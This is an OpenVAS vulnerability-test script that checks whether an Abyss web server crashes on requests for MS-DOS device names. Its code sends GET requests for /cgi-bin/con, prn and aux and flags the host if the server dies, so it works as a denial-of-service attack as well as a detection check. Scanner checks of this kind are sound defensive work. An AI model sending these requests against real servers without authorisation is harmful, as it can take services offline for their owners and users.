###############################################################################
# OpenVAS Vulnerability Test
# $Id: abyss_msdos_dos.nasl 4797 2016-12-17 14:04:59Z cfi $
#
# Abyss httpd DoS
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on work from (C) Tenable Network Security
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

#  Ref: R00tCr4ck <root@cyberspy.org>

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.15563");
  script_version("$Revision: 4797 $");
  script_tag(name:"last_modification", value:"$Date: 2016-12-17 15:04:59 +0100 (Sat, 17 Dec 2016) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"OSVDB", value:"11006");
  script_tag(name:"cvss_base", value:"7.1");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:C");
  script_name("Abyss httpd DoS");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2004 David Maciejak");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  tag_summary = "It was possible to kill the web server by sending a MS-DOS device
  names in an HTTP request.";

  tag_impact = "An attacker may use this flaw to prevent this host from performing its
  job properly.";

  tag_solution = "Upgrade your web server to the latest version.";

  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"impact", value:tag_impact);

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");

port = get_http_port( default:80 );
if( http_is_dead( port:port, retry:4 ) ) exit( 0 );

dev_name = make_list( "con", "prn", "aux" );

host = http_host_name( port:port );

foreach dev( dev_name ) {

  req = string( "GET /cgi-bin/", dev, " HTTP/1.0\r\n",
                "Host: ", host, "\r\n\r\n" );
  http_send_recv( port:port, data:req );
  if( http_is_dead( port:port ) ) {
    security_message( port:port);
    exit( 0 );
  }
}

exit( 99 );
